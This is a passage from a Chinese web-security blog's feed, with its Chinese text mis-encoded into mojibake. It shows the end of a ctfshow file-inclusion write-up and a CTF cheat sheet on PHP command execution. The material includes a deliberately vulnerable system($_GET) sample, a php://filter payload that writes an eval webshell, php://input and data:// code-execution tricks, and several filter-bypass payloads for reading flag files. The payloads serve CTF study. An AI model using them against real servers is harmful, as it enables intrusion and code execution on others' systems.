young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>base64å’Œrot13è¢«è¿‡æ»¤äº†ï¼Œç”¨ä¸€ç§å…¶ä»–çš„åè®®å³å¯</p><p>payload: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php </span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshowæ–‡ä»¶åŒ…å«&quot;&gt;&lt;a href=&quot;#ctfshowæ–‡ä»¶åŒ…å«&quot; class=&quot;headerlink&quot; title=&quot;ctfshowæ–‡ä»¶åŒ…å«&quot;&gt;&lt;/a&gt;ctfshowæ–‡ä»¶åŒ…å«&lt;/h1&gt;&lt;h2 id=&quot;web78&quot;&gt;&lt;a href=&quot;#web78&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ</title>
    <link href="http://websec.space/2022/02/04/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://websec.space/2022/02/04/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2022-02-03T16:00:00.000Z</published>
    <updated>2022-02-04T09:37:12.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ"><a href="#webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ"></a>webå®‰å…¨ä¹‹å‘½ä»¤æ‰§è¡Œ</h1><p>æ— èŠæ—¶é—´ï¼Œå†™ç‚¹æœ€è¿‘ä¸€ç›´ç ”ç©¶çš„å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å¿ƒå¾—ä¸æ€»ç»“ã€‚</p><p>å¸Œæœ›åšæˆä¸€ä¸ªç±»ä¼¼å­—å…¸ç±»å‹çš„æ–‡æ¡£ã€‚</p><h2 id="æˆå› "><a href="#æˆå› " class="headerlink" title="æˆå› "></a>æˆå› </h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œåœ¨å¼€å‘è€…ä½¿ç”¨ä¸€äº›æ‰§è¡Œå‘½ä»¤å‡½æ•°ä¸”æœªå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œå®‰å…¨æ£€æŸ¥æ—¶ï¼Œå¯ä»¥æ³¨å…¥æ¶æ„å‘½ä»¤ï¼Œæ˜¯æ•´å°æœåŠ¡å™¨å¤„äºå±é™©ä¸­ã€‚</p><blockquote><p>è¿™ä¸ªå®šä¹‰å¯èƒ½æœ‰ç‚¹æŠ½è±¡ï¼Œä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œä¾‹å¦‚ä¸€æ®µPHPç¨‹åºæƒ³åœ¨ç¨‹åºè¿è¡Œä¸­ï¼Œå»è°ƒç”¨å…¶ä»–ä¸€ä¸ªpythonçš„ç³»ç»Ÿï¼Œä»–ä½¿ç”¨system(â€˜python main.pyâ€™);å»è¿è¡Œè¿™ä¸ªç³»ç»Ÿï¼Œä½†ä¸€æ—¦æ‹¬å·ä¸­çš„å†…å®¹æˆ‘ä»¬å¯æ§ï¼Œè¿™æ—¶å€™æ¼æ´å°±äº§ç”Ÿäº†ã€‚</p></blockquote><p>åœ¨ctfä¸­ï¼Œå‘½ä»¤æ‰§è¡Œä¸€èˆ¬å‘ç”Ÿåœ¨è¿œç¨‹ï¼Œæ•…ç§°ä¸ºè¿œç¨‹å‘½ä»¤æ‰§è¡Œå³rceï¼Œä»Šå¹´å› ä¸ºlog4jçš„å‡ºç°ï¼Œå¯ä»¥è¯´æ˜¯rceçš„é«˜å…‰ã€‚</p><p>åœ¨æ­¤æ”¾ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h2><p>1.ç›´æ¥è·å–flag</p><p>2.è¿›è¡Œåå¼¹shellï¼Œç„¶åè¿›å…¥å†…ç½‘çš„å¤§é—¨</p><p>3.åˆ©ç”¨å‡ºé¢˜äººå¯¹æƒé™çš„æ§åˆ¶ä¸ä¸¥æ ¼ï¼Œå¯¹é¢˜ç›®ç¯å¢ƒæ‹¥æœ‰æ§åˆ¶æƒï¼Œå¯¼è‡´å…¶ä»–é˜Ÿä¼é€‰æ‰‹æ— æ³•è§£é¢˜ã€‚</p><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p><strong>è½¬ä¹‰å­—ç¬¦</strong>ï¼Œwindowsçš„æ³¨æ„å­—ç¬¦ä¸º^ ,Linuxçš„è½¬ä¹‰å­—ç¬¦ä¸º\</p><p><strong>å¤šæ¡å‘½ä»¤æ‰§è¡Œ</strong>ï¼ŒWindowsä¸‹ä¸º&amp;&amp;ã€||ã€%0aï¼Œlinuxä¸º&amp;&amp;ã€||ã€;ã€$()ã€``ã€%0aã€%0d</p><blockquote><p>åœ¨Linuxæƒ…å†µä¸‹éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŒå¼•å·åŒ…è£¹çš„â€``â€,â€$()â€çš„å†…å®¹è¢«å½“ä½œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å•å¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²å°±æ˜¯çº¯å­—ç¬¦ä¸²ï¼Œä¸ä¼šåšä»»ä½•è§£æã€‚</p></blockquote><p><strong>é»‘åå•ç»•è¿‡</strong></p><p><strong>ç™½åå•ç»•è¿‡</strong></p><h2 id="å„ç§å§¿åŠ¿"><a href="#å„ç§å§¿åŠ¿" class="headerlink" title="å„ç§å§¿åŠ¿"></a>å„ç§å§¿åŠ¿</h2><h3 id="æŸ¥çœ‹æ–‡ä»¶è·¯å¾„çš„æ–¹å¼"><a href="#æŸ¥çœ‹æ–‡ä»¶è·¯å¾„çš„æ–¹å¼" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶è·¯å¾„çš„æ–¹å¼"></a>æŸ¥çœ‹æ–‡ä»¶è·¯å¾„çš„æ–¹å¼</h3><h4 id="åˆ©ç”¨scandirå‡½æ•°"><a href="#åˆ©ç”¨scandirå‡½æ•°" class="headerlink" title="åˆ©ç”¨scandirå‡½æ•°"></a>åˆ©ç”¨scandirå‡½æ•°</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨glob"><a href="#åˆ©ç”¨glob" class="headerlink" title="åˆ©ç”¨glob://"></a>åˆ©ç”¨glob://</h4><p><strong>glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</strong></p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121916703">(43æ¡æ¶ˆæ¯) ç»•è¿‡open_basedirçš„é™åˆ¶_unexpectedthingçš„åšå®¢-CSDNåšå®¢</a></p><p>è´´ä¸€ç¯‡æ–‡ç« æŸ¥æ‰¾æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶å¤¹</p><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&#x27;glob:///*&#x27;);</span><br><span class="line">foreach($dir as $d)&#123;</span><br><span class="line">    echo $d-&gt;__toString().&#x27;&lt;/br&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    exit();</span><br><span class="line">?&gt;</span><br><span class="line">//urlç¼–ç </span><br></pre></td></tr></table></figure><h3 id="è¿‡æ»¤å¸¸è§çš„å‡½æ•°"><a href="#è¿‡æ»¤å¸¸è§çš„å‡½æ•°" class="headerlink" title="è¿‡æ»¤å¸¸è§çš„å‡½æ•°"></a>è¿‡æ»¤å¸¸è§çš„å‡½æ•°</h3><h4 id="åˆ©ç”¨å¤åˆ¶æ–‡ä»¶"><a href="#åˆ©ç”¨å¤åˆ¶æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨å¤åˆ¶æ–‡ä»¶"></a>åˆ©ç”¨å¤åˆ¶æ–‡ä»¶</h4><p>ä»¥å¸Œæœ›è¯»å–flag.phpä¸ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;z.txt</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç›´æ¥è®¿é—®/z.txtå³å¯æŸ¥çœ‹</p><h4 id="æœ‰å…¶ä»–å¯ä»¥æ‰§è¡Œä¸”å¯ä»¥é€šè¿‡httpä¼ å‚çš„å˜é‡"><a href="#æœ‰å…¶ä»–å¯ä»¥æ‰§è¡Œä¸”å¯ä»¥é€šè¿‡httpä¼ å‚çš„å˜é‡" class="headerlink" title="æœ‰å…¶ä»–å¯ä»¥æ‰§è¡Œä¸”å¯ä»¥é€šè¿‡httpä¼ å‚çš„å˜é‡"></a>æœ‰å…¶ä»–å¯ä»¥æ‰§è¡Œä¸”å¯ä»¥é€šè¿‡httpä¼ å‚çš„å˜é‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">[post data]</span><br><span class="line">a=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨show-source"><a href="#åˆ©ç”¨show-source" class="headerlink" title="åˆ©ç”¨show_source"></a>åˆ©ç”¨show_source</h4><p>exp1ï¼š</p><p>åªèƒ½å¾—åˆ°æ•°ç»„çš„ç¬¬äºŒä½æˆ–è€…å€’æ•°ç¬¬äºŒä½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>exp2ï¼š</p><p>éšæœºè·å–ï¼Œéœ€è¦å¤šåˆ·æ–°å‡ æ¬¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>exp3ï¼šé¸¡è‚‹ï¼Œæœ‰æ—¶å€™ä¸èƒ½æ‹¿åˆ°å®é™…å€¼</p><p>session_start(): å‘Šè¯‰PHPä½¿ç”¨<a href="https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020">session</a>;    session_id(): è·å–åˆ°å½“å‰çš„session_idå€¼ï¼›æ‰‹åŠ¨è®¾ç½®cookieä¸­PHPSESSID=flag.phpï¼›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><h4 id="åˆ©ç”¨includeä½¿ç”¨æ–‡ä»¶åŒ…å«"><a href="#åˆ©ç”¨includeä½¿ç”¨æ–‡ä»¶åŒ…å«" class="headerlink" title="åˆ©ç”¨includeä½¿ç”¨æ–‡ä»¶åŒ…å«"></a>åˆ©ç”¨includeä½¿ç”¨æ–‡ä»¶åŒ…å«</h4><h5 id="åˆ©ç”¨php"><a href="#åˆ©ç”¨php" class="headerlink" title="åˆ©ç”¨php://"></a>åˆ©ç”¨php://</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><strong>php://åè®®</strong></p><p><strong>æ¡ä»¶</strong>ï¼š</p><p><code>allow_url_fopen</code>:off/on</p><p><code>allow_url_include</code> :ä»…<code>php://input php://stdin php://memory php://temp </code>éœ€è¦on</p><p>ä½œç”¨<strong>ï¼š<br><code>php://</code> è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code>ï¼Œ<code>php://filter</code>ç”¨äº</strong>è¯»å–æºç <strong>ï¼Œ<code>php://input</code>ç”¨äº</strong>æ‰§è¡Œphpä»£ç ã€‚</p><p>è¯´æ˜ï¼š<br>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ<br>å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p><table><thead><tr><th>åè®®</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>php://input</td><td>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„<code>data</code>éƒ¨åˆ†ï¼Œåœ¨<code>enctype=&quot;multipart/form-data&quot;</code> çš„æ—¶å€™<code>php://input </code>æ˜¯æ— æ•ˆçš„ã€‚ä¸è¦ç”¨hackerä¼ å‚</td></tr><tr><td>php://output</td><td>åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ <code>php://fd/3</code> å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ <code>php://memory</code> æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ <code>php://temp</code> ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ <code>2MB</code>ï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ <code>sys_get_temp_dir()</code> çš„æ–¹å¼ä¸€è‡´ã€‚</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼<code>ï¼ˆall-in-oneï¼‰</code>çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ <code>readfile()</code>ã€<code>file()</code> å’Œ <code>file_get_contents()</code>ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</td></tr></tbody></table><p><strong><code>php://filter</code>å‚æ•°è¯¦è§£</strong></p><p>è¯¥åè®®çš„å‚æ•°ä¼šåœ¨è¯¥åè®®è·¯å¾„ä¸Šè¿›è¡Œä¼ é€’ï¼Œå¤šä¸ªå‚æ•°éƒ½å¯ä»¥åœ¨ä¸€ä¸ªè·¯å¾„ä¸Šä¼ é€’ã€‚å…·ä½“å‚è€ƒå¦‚ä¸‹ï¼š</p><table><thead><tr><th>php://filter å‚æ•°</th><th>æè¿°</th><th></th></tr></thead><tbody><tr><td>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td><td>å¿…é¡»é¡¹ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td><td></td></tr><tr><td>read=&lt;è¯»é“¾çš„è¿‡æ»¤å™¨&gt;</td><td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ*\</td><td>*ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>write=&lt;å†™é“¾çš„è¿‡æ»¤å™¨&gt;</td><td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ\</td><td>ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>&lt;; ä¸¤ä¸ªé“¾çš„è¿‡æ»¤å™¨&gt;</td><td>ä»»ä½•æ²¡æœ‰ä»¥ <em>read=</em> æˆ– <em>write=</em> ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td><td></td></tr></tbody></table><p><strong>å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼ˆ4ç±»ï¼‰</strong></p><p>æ­¤å¤„åˆ—ä¸¾ä¸»è¦çš„è¿‡æ»¤å™¨ç±»å‹ï¼Œè¯¦ç»†å†…å®¹è¯·å‚è€ƒï¼š<a href="https://link.segmentfault.com/?enc=TvNqxQJsmPli714fAg4qxA==.jfUSJBdJsmST/7kefiWpUGR3c09fXjXvpga5K0ExDmpAxVkhIcaZZ7Oag21SmAlO">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>string.rot13</td><td>ç­‰åŒäº<code>str_rot13()</code>ï¼Œrot13å˜æ¢</td></tr><tr><td>string.toupper</td><td>ç­‰åŒäº<code>strtoupper()</code>ï¼Œè½¬å¤§å†™å­—æ¯</td></tr><tr><td>string.tolower</td><td>ç­‰åŒäº<code>strtolower()</code>ï¼Œè½¬å°å†™å­—æ¯</td></tr><tr><td>string.strip_tags</td><td>ç­‰åŒäº<code>strip_tags()</code>ï¼Œå»é™¤htmlã€PHPè¯­è¨€æ ‡ç­¾</td></tr></tbody></table><table><thead><tr><th>è½¬æ¢è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>ç­‰åŒäº<code>base64_encode()</code>å’Œ<code>base64_decode()</code>ï¼Œbase64ç¼–ç è§£ç </td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable å­—ç¬¦ä¸²ä¸ 8-bit å­—ç¬¦ä¸²ç¼–ç è§£ç </td></tr></tbody></table><table><thead><tr><th>å‹ç¼©è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º gzip å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>åŒä¸Šï¼Œåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º bz2 å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ã€‚</td></tr></tbody></table><table><thead><tr><th>åŠ å¯†è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt å¯¹ç§°åŠ å¯†ç®—æ³•</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt å¯¹ç§°è§£å¯†ç®—æ³•</td></tr></tbody></table><p>å®ä¾‹ï¼š</p><p><code>php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]</code>è¯»å–æ–‡ä»¶æºç ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><code>php://input + [POST DATA]</code>æ‰§è¡Œphpä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span></span><br><span class="line">[POST DATAéƒ¨åˆ†](ä¸è¦ç”¨hackbarä¼ å‚)</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨data"><a href="#åˆ©ç”¨data" class="headerlink" title="åˆ©ç”¨data://"></a>åˆ©ç”¨data://</h5><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/plain,&lt;?php cat fl*g.php ?&gt;</span><br></pre></td></tr></table></figure><p><strong><code>data://</code> åè®®</strong></p><ul><li><p><strong>æ¡ä»¶</strong>ï¼š</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>ä½œç”¨</strong>ï¼šè‡ª<code>PHP&gt;=5.2.0</code>èµ·ï¼Œå¯ä»¥ä½¿ç”¨<code>data://</code>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚</p></li><li><p><strong>ç”¨æ³•</strong>ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text/plain,</span><br><span class="line">data:<span class="regexp">//</span>text/plain;base64,</span><br></pre></td></tr></table></figure></li></ul><h3 id="è¿‡æ»¤æ‰æ–‡ä»¶å"><a href="#è¿‡æ»¤æ‰æ–‡ä»¶å" class="headerlink" title="è¿‡æ»¤æ‰æ–‡ä»¶å"></a>è¿‡æ»¤æ‰æ–‡ä»¶å</h3><p>ä»¥è¿‡æ»¤æ‰äº†flagä¸¾ä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;cat fl&quot;&quot;ag.php&#x27;);</span><br><span class="line">system(&#x27;cat fla``g.php&#x27;);</span><br><span class="line">echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨é€šé…ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fla?.php</span><br><span class="line">fla*</span><br></pre></td></tr></table></figure><h3 id="è¿‡æ»¤æ‰äº†ç©ºæ ¼"><a href="#è¿‡æ»¤æ‰äº†ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤æ‰äº†ç©ºæ ¼"></a>è¿‡æ»¤æ‰äº†ç©ºæ ¼</h3><p>æ³•ä¸€ï¼š%0aï¼Œ%0d</p><p>æ³•äºŒï¼šåˆ©ç”¨ç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡</p><p>Linuxä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$IFS$9</span><br><span class="line">&#123;cmd,args&#125;</span><br><span class="line">cat&lt;&gt;flag</span><br><span class="line">$&#123;IFS&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿‡æ»¤äº†å­—æ¯"><a href="#è¿‡æ»¤äº†å­—æ¯" class="headerlink" title="è¿‡æ»¤äº†å­—æ¯"></a>è¿‡æ»¤äº†å­—æ¯</h3><h5 id="æ‰§è¡Œä¸´æ—¶å­˜å‚¨æ–‡ä»¶"><a href="#æ‰§è¡Œä¸´æ—¶å­˜å‚¨æ–‡ä»¶" class="headerlink" title="æ‰§è¡Œä¸´æ—¶å­˜å‚¨æ–‡ä»¶"></a>æ‰§è¡Œä¸´æ—¶å­˜å‚¨æ–‡ä»¶</h5><p>å¼€å¯è®¾ç½®åï¼Œphpåœ¨æ¥å—åˆ°æœªçŸ¥çš„æ–‡ä»¶æ—¶ï¼Œä¼šä¸´æ—¶å‚¨å­˜åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå†™ä¸€ä¸ªæœ¨é©¬å¹¶å°†å…¶æ‰§è¡Œã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=.+/???/????????[@-[]</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p></blockquote><h5 id="base64æµ"><a href="#base64æµ" class="headerlink" title="base64æµ"></a>base64æµ</h5><p>è¿™ç§æƒ…å†µåªèƒ½äº‹systemæ‰§è¡Œï¼Œä¸”linuxä¸‹/binä¸‹æœ‰base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/???/????64 ????.???</span><br><span class="line">#/bin/base64 flag.php </span><br></pre></td></tr></table></figure><h5 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h5><p>bzip2çš„ä½¿ç”¨<br>bzip2æ˜¯linuxä¸‹é¢çš„å‹ç¼©æ–‡ä»¶çš„å‘½ä»¤<br>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥å‘½ä»¤å‹ç¼©flag.php ç„¶åè¿›è¡Œä¸‹è½½<br>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯/usr/bin/bzip2 